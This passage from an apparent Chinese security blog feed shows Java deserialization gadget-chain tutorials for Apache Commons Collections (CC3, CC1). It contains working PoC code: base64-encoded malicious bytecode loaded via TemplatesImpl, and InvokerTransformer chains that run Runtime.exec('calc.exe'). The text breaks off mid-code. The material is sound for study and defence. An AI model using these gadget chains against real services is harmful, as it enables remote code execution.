javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        ConstantTransformer trAX=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class);</span><br><span class="line">        InstantiateTransformer in=<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Impl&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;trAX,in&#125;;</span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap=LazyMap.decorate(innermap, chaind);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        HashSet map=<span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        map.add(tiedMapEntry);</span><br><span class="line">        innermap.remove(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field=chaind.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chaind,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/36318858/image-20250703195013983-175245726416425.png" alt="image-20250703195013983"></p><p>CC6的HashMap和CC1版本下的poc修改是一样的，这里就不赘述了。</p><p>CC6版本下+TrAXFilter有个好处就是如果过滤了InvokerTransformer能用InstantiateTransformer绕过，且能通杀Java7、8版本。</p><p>以上就是本文全部内容，欢迎师傅们批评指正！感谢阅读！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections3.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections3.java</a></p><p><a href="https://nivi4.notion.site/Java-CommonCollections3-6efcc82835764b3d9937feab2562abb9">https://nivi4.notion.site/Java-CommonCollections3-6efcc82835764b3d9937feab2562abb9</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13854098.html#0x03-cc3%E9%93%BE%E8%B0%83%E8%AF%95">https://www.cnblogs.com/nice0e3/p/13854098.html#0x03-cc3%E9%93%BE%E8%B0%83%E8%AF%95</a></p><p><a href="https://www.cnblogs.com/1vxyz/p/17458691.html">https://www.cnblogs.com/1vxyz/p/17458691.html</a></p><p><a href="https://www.freebuf.com/vuls/361100.html">https://www.freebuf.com/vuls/361100.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> CC链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化：CC1利用链深度解析</title>
      <link href="/archives/186141d8/"/>
      <url>/archives/186141d8/</url>
      
        <content type="html"><![CDATA[<h2 id="Commons-Clollections"><a href="#Commons-Clollections" class="headerlink" title="Commons Clollections"></a>Commons Clollections</h2><p>Commons Collection是Apache软件基金会的一个开源项目，它为 Java 的集合框架提供了一系列额外的集合类和算法。这些类和算法在 Java 的标准集合框架的基础上进行了扩展，使得开发者在处理集合数据时可以更加灵活和高效。Commons Collections 提供了各种强大的集合接口和实现，如有序集合、队列、堆等，以及一些高级算法，如过滤、转换等，并广泛运用于Java开发中。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="下载配置jdk-8u65"><a href="#下载配置jdk-8u65" class="headerlink" title="下载配置jdk-8u65"></a>下载配置jdk-8u65</h3><p>下载地址：<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html#license-lightbox">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html#license-lightbox</a></p><p><img src="/archives/186141d8/image-20250613000150001.png" alt="image-20250613000150001"></p><p><img src="/archives/186141d8/image-20250613000209446.png" alt="image-20250613000209446"></p><p>下载好后直接双击安装，因为后期会分析其他cc链，其对应jdk的版本也不同，所以尽量将下载的jdk放在一个目录下。</p><p>然后将下载后的jdk配置到IDEA里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">左上角file-&gt;Project Structure-&gt;SDK</span><br></pre></td></tr></table></figure><p><img src="/archives/186141d8/image-20250613001343282.png" alt="image-20250613001343282"></p><h3 id="配置maven依赖"><a href="#配置maven依赖" class="headerlink" title="配置maven依赖"></a>配置maven依赖</h3><p>添加jdk后需要配置maven依赖下载CommonsCollections3.2.1版本</p><p>先创建一个maven项目：<br><img src="/archives/186141d8/image-20250619102334277.png" alt="image-20250619102334277"></p><p>pom.xml文件写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p><img src="/archives/186141d8/image-20250604114510311.png" alt="image-20250604114510311"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install -U</span><br></pre></td></tr></table></figure><h3 id="下载相应源码"><a href="#下载相应源码" class="headerlink" title="下载相应源码"></a>下载相应源码</h3><p>由于jdk自带的包里面有些文件是反编译的.class文件，我们没办法清楚的看懂源码，为了方便调试，所以需要将他们转变为.java文件，所以需要安装相应源码：</p><p><strong>下载地址</strong>:<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p><img src="/archives/186141d8/image-20250604102853212.png" alt="image-20250604102853212"></p><p>点击左下角zip下载</p><p>下载后解压当前压缩包，将openJDK中的&#x2F;src&#x2F;share&#x2F;classes下的sun文件夹拷贝到jdk下的src文件夹中去。然后src文件夹添加到IDEA源路径中：<br><img src="/archives/186141d8/image-20250613001138267.png" alt="image-20250613001138267"></p><h2 id="相关类和接口"><a href="#相关类和接口" class="headerlink" title="相关类和接口"></a>相关类和接口</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>用于对Java标准数据结构Map做一个修饰。被修饰过的Map，在添加新数据时，将执行一个回调。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map OuterMap=TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure><p>innerMap是被修饰的Map,OuterMap是修饰后的Map。而keyTransformer是处理新元素key的回调，valuetransformer是处理新元素value的回调。</p><p><img src="/archives/186141d8/image-20250613142818626.png" alt="image-20250613142818626"></p><p><img src="/archives/186141d8/image-20250613142836710.png" alt="image-20250613142836710"></p><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>一个接口，实现一个transform方法：</p><p><img src="/archives/186141d8/image-20250613143044846.png" alt="image-20250613143044846"></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>实现Transformer接口的一个类：</p><p><img src="/archives/186141d8/image-20250613143456512.png" alt="image-20250613143456512"></p><p>重写了tranform方法，该方法传入一个对象，最后返回这个对象。</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>实现Transformer接口的一个类：</p><p><img src="/archives/186141d8/image-20250613144109496.png" alt="image-20250613144109496"></p><p>同样重写了transform方法，该方法通过调用反射：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>可实现执行任何方法</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>实现Transformer接口的一个类：</p><p><img src="/archives/186141d8/image-20250613144947827.png" alt="image-20250613144947827"></p><p><img src="/archives/186141d8/image-20250613144812869.png" alt="image-20250613144812869"></p><p>也实现了transform方法重写，它会遍历iTransformers变量中的所有Transformer对象，并执行该对象中重写的transform方法，参数为object，并将结果赋值给object。</p><h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p>实现Transformer接口的一个类：</p><p><img src="/archives/186141d8/image-20250613145758799.png" alt="image-20250613145758799"></p><p>重写了transform方法，通过反射调用传入对象的构造方法实例化对象，3.2.2之后启用序列化也需要属性Dproperty&#x3D;true，4.1之后禁止用于反序列化</p><h2 id="CC1分析"><a href="#CC1分析" class="headerlink" title="CC1分析"></a>CC1分析</h2><p>在找链子时我们往往都是通过看那个类中的方法能够调用危险方法，然后依次向上回溯，直到找到<strong>重写了readObject方法</strong>的类，且该类继承了序列化接口。那么我们在向上回溯中所调用的方法连接起来就是一条链子，而这个过程就是Java漏洞找链子的过程。这是一个倒推的过程，终点是我们的漏洞利用点，起点是反序列化入口readObject方法。</p><h3 id="TransformedMap链分析"><a href="#TransformedMap链分析" class="headerlink" title="TransformedMap链分析"></a>TransformedMap链分析</h3><p>CC1链中源头其实就是Commons Collections库中Transformer接口的transform方法。</p><p><img src="/archives/186141d8/image-20250613143044846.png" alt="image-20250613143044846"></p><p>然后寻找继承了该接口的类：</p><p><img src="/archives/186141d8/image-20250613152205449.png" alt="image-20250613152205449"></p><p>可以看到很多，其中在InvokerTransformer类中我们可以发现它重写的transform方法可以执行任意方法：</p><p><img src="/archives/186141d8/image-20250613144109496.png" alt="image-20250613144109496"></p><p>通过反射来调用任意方法执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>那么我们就可构造恶意方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">常规反射:</span><br><span class="line">Class cls=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method m= cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">m.invoke(cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(cls),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">transform方法:</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        InvokerTransformer in=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        in.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/186141d8/image-20250613154038875.png" alt="image-20250613154038875"></p><p>成功弹出计算机，那么现在利用点找到了，只需要依次向上回溯找入口readObject了</p><p>所以现在我们需要找到哪些地方调用了transform方法，在TransformedMap类的checkSetValue方法中：</p><p><img src="/archives/186141d8/image-20250613163303472.png" alt="image-20250613163303472"></p><p>正好调用了transform方法，而且valueTransformer对象正好是我们可控的：</p><p><img src="/archives/186141d8/image-20250613163418810.png" alt="image-20250613163418810"></p><p>但有个问题是TransformedMap构造方法和checkSetValue方法是protected类型的，外部不能直接调用，所以我们需要找个方法获取该实例，恰好在上面发现了decorate静态方法：</p><p><img src="/archives/186141d8/image-20250613163909542.png" alt="image-20250613163909542"></p><p>该方法刚好可以实例化TransformedMap类，所以只需要调用这个方法就可以得到TransformedMap实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(hashMap,<span class="literal">null</span>, invokerTransformer);</span><br></pre></td></tr></table></figure><p>现在我们valueTransformer已经带入了invokerTransformer，所以只需要找到能够调用checkSetValue方法的方法就能够执行<code>invokerTransformer.tranform()</code></p><p>全局搜索checkSetValue：</p><p><img src="/archives/186141d8/image-20250613170049097.png" alt="image-20250613170049097"></p><p>只有AbstractInputCheckedMapDecorator类的setValue方法调用了checkSetValue：</p><p><img src="/archives/186141d8/image-20250613170542483.png" alt="image-20250613170542483"></p><p><img src="/archives/186141d8/image-20250613173014189.png" alt="image-20250613173014189"></p><p>这段代码中entry是Map.Entry的一个键值对 (Key-Value Pair) 对象，Map.Entry接口代表的是Map中的一个键值对，它定义了一种在Map中遍历和操作键值对的标准方式：</p><p><img src="/archives/186141d8/image-20250614220602390.png" alt="image-20250614220602390"></p><p>由于MapEntry继承自AbstractMapEntryDecorator类：</p><p><img src="/archives/186141d8/image-20250614215649782.png" alt="image-20250614215649782"></p><p>而该类同样有setValue方法，并且引入了Map.Entry接口，所以我们可以通过Map遍历来调用setValue方法，从而调用checkSetValue方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(hashMap,<span class="literal">null</span>, invokerTransformer);</span><br><span class="line">hashMap.put(<span class="string">&quot;b1uel0n3&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//设置键值对，方便遍历，也可以不加</span></span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())</span><br><span class="line">entry.setValue(Runtime.getRuntime());   <span class="comment">//遍历Map，并将Runtime.getRuntime()对象传入setValue方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Map的entrySet()方法返回一个实现Map.Entry接口的对象集合。</p></blockquote><p><img src="/archives/186141d8/image-20250614233306923.png" alt="image-20250614233306923"></p><p>成功弹计算机。</p><p>简单梳理一下，就是我们利用<strong>TransformedMap</strong>类中的<strong>decorate</strong>方法创建了一个<strong>TransformedMap</strong>实例，而<strong>TransformedMap</strong>类里的<strong>checkSetValue</strong>方法能够调用<strong>InvokerTransformer</strong>类中的<strong>transform</strong>方法来执行我们的恶意命令。但<strong>TransformedMap</strong>类里的<strong>checkSetValue</strong>方法是protected类型不能直接调用，所以需要Map遍历间接调用，在进行Map遍历时，会执行TransformedMap的setValue方法，而TransformedMap本身是没有重写setValue方法的，但它继承自<strong>AbstractInputCheckedMapDecorator</strong>类，而该类中的<strong>MapEntry</strong>副类重写了<strong>setValue</strong>方法，所以会执行该方法里面的<strong>checkSetValue</strong>方法从而形成闭环。</p><p>接下来我们只需要找到一个存在readObject入口能代替Map遍历的效果来调用setValue方法的类，并且该类能够被序列化就大功告成了。于是我们直接搜索setValue看哪些方法调用了它，找到<strong>AnnotationInvocationHandler</strong>类，它是 Java 内部用于处理注解动态代理的核心类：</p><p><img src="/archives/186141d8/image-20250615002734149.png" alt="image-20250615002734149"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">    Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">    <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">        <span class="keyword">if</span> (!(memberType.isInstance(value) || value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">            memberValue.setValue(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                    value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span></span><br><span class="line">                ).setMember(</span><br><span class="line">                    annotationType.members().get(name)</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的逻辑就是进行Map遍历，返回memberValues的所有键值对，<code>String name = memberValue.getKey();</code>语句和<code>Object value = memberValue.getValue();</code>语句用于获取键值对。而这里的setValue创建了一个异常代理对象，<code>annotationType.members()</code>获取注解类型的所有成员方法，<code>get(name)</code>根据成员名获取对应的 <code>Method</code> 对象。</p><p>再看下merberType、merberValues参数是否可控，找到构造器：</p><p><img src="/archives/186141d8/image-20250616093459708.png" alt="image-20250616093459708"></p><p>该构造器接受两个参数，一个type，类型是<code>Class&lt;? extends Annotation&gt;</code>，即需要是注解类型；另一个是memberValues，Map类型，且都是可控的，那么<strong>merberValues</strong>就可以传入我们之前的<strong>transformedMap</strong>类，再通过<strong>readObject</strong>调用<strong>setValue</strong>方法。</p><p>但存在一个问题，就是可以看到AnnotationInvocationHandler构造器前面是没有public的，即这个类只能在sun.reflect.annotation本包下调用，外部是不能直接调用的，但我们可以通过反射获取该构造器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class cls=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">constructor.newInstance(Retention.class,transformedMap);</span><br></pre></td></tr></table></figure><p>注解类可以在java.lang.annotation包下找到，有@符号的就是注解类：</p><p><img src="/archives/186141d8/image-20250616100303846.png" alt="image-20250616100303846"></p><p>修改poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span 